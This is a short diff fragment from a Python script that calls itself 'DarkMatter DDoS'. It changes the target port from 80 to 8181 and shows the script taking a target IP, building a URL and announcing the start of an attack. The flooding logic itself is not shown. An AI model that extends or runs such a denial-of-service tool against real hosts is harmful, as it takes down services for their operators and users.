@@ -45,7 +45,7 @@ def attack():
 
 print("Welcome To DarkMatter DDoS\n")
 ip = sys.argv[1]
-port = int(80)
+port = int(8181)
 url = f"http://{str(ip)}"
 print("[>>>] Starting the attack [<<<]")
 sleep(1)
